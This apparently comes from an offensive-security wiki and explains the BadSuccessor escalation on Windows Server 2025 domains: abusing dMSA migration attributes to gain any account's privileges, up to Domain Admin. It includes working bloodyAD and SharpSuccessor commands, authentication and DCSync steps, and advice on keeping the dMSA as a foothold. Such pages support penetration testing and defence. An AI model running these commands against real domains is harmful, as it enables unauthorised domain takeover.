---
title: "BadSuccessor: dMSA migration abuse on Server 2025"
description: "Escalating to any account, including Domain Admin, on a Windows Server 2025 domain by creating or editing a delegated Managed Service Account and setting its migration attributes so the KDC builds its PAC from a superseded account's SIDs."
keywords:
  - BadSuccessor
  - dMSA
  - msDS-ManagedAccountPrecededByLink
  - msDS-DelegatedMSAState
  - Server 2025
---

# BadSuccessor

Windows Server 2025 adds **delegated Managed Service Accounts (dMSA)** and a supported way to **migrate** a legacy service account onto a dMSA. The migration is expressed in two attributes, and the KDC trusts them without checking that a real migration took place: if a dMSA's **`msDS-ManagedAccountPrecededByLink`** points at an account and **`msDS-DelegatedMSAState`** is `2` ("migration completed"), the KDC builds the dMSA's PAC from the **superseded account's SIDs**. So whoever can set those two attributes on a dMSA they control can authenticate as that dMSA and receive the full privileges of **any** account they name, up to Domain Admin. This is **BadSuccessor** (Akamai, 2025).

## Why it is so dangerous

- It works with the **default configuration** of a Server 2025 domain and does **not** require the domain to use dMSAs at all; the feature's mere presence (one Server 2025 DC) is enough.
- The only prerequisite is the ability to **create a dMSA** (`CreateChild` for the msDS-DelegatedManagedServiceAccount class on some OU) or to **write** the migration attributes on an existing dMSA. Create rights on an OU are far more common and far less guarded than Domain Admin, and any such foothold can target **any** account in the domain.
- There is no "already privileged" requirement, so it is a true low-to-high escalation, not just persistence.

## The attack

```bash
# Linux: bloodyAD automates create + weaponize (set the migration link and state)
bloodyAD --host <dc> -d example.local -u user -p pass add badSuccessor 'evil_dmsa$'

# or the attributes by hand on a dMSA you created
bloodyAD ... set object 'evil_dmsa$' msDS-ManagedAccountPrecededByLink -v 'CN=Administrator,CN=Users,DC=example,DC=local'
bloodyAD ... set object 'evil_dmsa$' msDS-DelegatedMSAState -v 2
```

```text
# Windows: SharpSuccessor uses a user's CreateChild right to create and weaponize the dMSA
SharpSuccessor.exe add /path:"OU=..." /account:evil_dmsa /name:evil_dmsa /impersonate:Administrator
```

Then **authenticate as the dMSA**: its managed password is retrievable the same way a gMSA's is, and the tooling requests a TGT for it. The returned ticket's PAC carries the superseded account's SIDs, so you act as that account immediately (request service tickets, DCSync as a DA, and so on).

## Exploitation notes

- Name a **high-value** superseded account (a Domain Admin, or the built-in Administrator) to jump straight to domain compromise; the KDC copies its SIDs wholesale.
- Hunt for OUs where your principal has `CreateChild` (or where `msDS-DelegatedManagedServiceAccount` can be created) during [ACL enumeration](../dacl/acl-enumeration.md); this is the gate, and it is frequently open through OU delegation.
- After Microsoft's fix, the migration-link path was constrained but not fully closed; the **BetterSuccessor** follow-up research shows dMSA abuse variants that still escalate, so treat a Server 2025 domain as exposed and test the current behaviour.
- A created dMSA and its links are durable until removed, so clean up the dMSA afterwards unless you want it as a foothold.

## Tools

- **bloodyAD** (`add badSuccessor`): create and weaponize a dMSA from Linux.
- **SharpSuccessor**: Windows PoC that abuses a `CreateChild` right end to end.
- **Rubeus / Impacket**: authenticate as the dMSA and obtain the TGT whose PAC carries the superseded SIDs.

## References

- Akamai: BadSuccessor (abusing dMSA for privilege escalation)
- AlteredSecurity: BetterSuccessor (dMSA abuse after the fix)
